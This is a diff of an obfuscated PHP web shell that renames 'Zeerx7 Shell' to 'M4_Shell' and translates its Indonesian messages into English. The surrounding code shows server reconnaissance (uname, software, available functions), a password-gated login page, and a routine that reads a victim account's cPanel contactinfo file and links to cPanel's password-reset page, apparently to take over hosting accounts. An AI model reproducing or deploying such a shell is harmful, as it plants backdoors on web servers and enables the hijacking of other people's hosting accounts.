@@ -137,7 +137,7 @@ $soft      = $_SERVER['SERVER_SOFTWARE'];
 $mysql     = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $curl      = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $mail      = (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
-echo "<center><font size='6px' color='lavender'>^_^ Zeerx7 Shell *_*</font><br></center>
+echo "<center><font size='6px' color='lavender'>^_^ M4_Shell *_*</font><br></center>
     <div class='pausi'>
         <p>" . php_uname() . "<br>" . ip_info() . "<br>
         $soft <br>
@@ -591,7 +591,7 @@ function pausi_tampilkan()
 function pausi_login()
 {
     global $MyPass;
-    echo "  <title>{ Zeerx7 Shell }</title>
+    echo "  <title>{ M4_Shell }</title>
   <meta name='viewport' content='width=device-width, initial-scale=1'>
   <style type='text/css'>
   body {
@@ -687,9 +687,9 @@ input[type="email"] { border-radius:5px; border-bottom-color: blue; border-top-c
         $IIIIIIIIIllI    = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
         $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
         if (!$read_named_conf) {
-            echo "<h1>maaf dak pacak di akses ster</h1><br><br> </pre></center>";
+            echo "<h1>Sorry, it's not easy to access ster</h1><br><br> </pre></center>";
         } else {
-            echo "<center>SALIN INI STER TRUZZ GASS <BR><BR></center>";
+            echo "<center>COPY THIS STER TRUZZ GASS <BR><BR></center>";
             echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">SALIN TEXT</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> ';
             echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '"><img class="wis"src="https://i.ibb.co/hgKSY0K/cooltext317065123408510.png"></a><br><br></center>';
             ;
